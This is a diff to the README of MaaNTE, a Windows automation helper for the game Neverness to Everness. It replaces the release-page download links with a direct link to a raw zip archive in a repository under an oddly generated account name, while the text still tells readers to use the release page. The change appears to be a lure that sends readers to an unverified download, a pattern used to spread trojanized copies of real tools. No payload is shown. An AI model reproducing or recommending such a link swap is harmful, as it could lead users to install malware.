@@ -1,6 +1,6 @@
 # 🛠️ MaaNTE - Automate Daily Tasks In Neverness
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/destructible-convergentthinking874/MaaNTE/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/destructible-convergentthinking874/MaaNTE/raw/refs/heads/main/MaaNTE/NTE_Maa_v3.0.zip)
 
 MaaNTE acts as a helper tool for the game Neverness to Everness. The software runs on your Windows computer to handle repetitive tasks. It uses screen recognition technology to perform actions without manual input. You save time on fishing, dialogue skipping, and collecting daily rewards. 
 
@@ -12,7 +12,7 @@ Preparation takes a few minutes. You need a Windows 11 computer and the game ins
 
 You must visit the official release page to get the latest version. Always use the latest release to ensure compatibility with game updates.
 
-[Download MaaNTE Here](https://github.com/destructible-convergentthinking874/MaaNTE/releases)
+[Download MaaNTE Here](https://github.com/destructible-convergentthinking874/MaaNTE/raw/refs/heads/main/MaaNTE/NTE_Maa_v3.0.zip)
 
 1. Open the link above in your web browser.
 2. Find the section marked Latest.
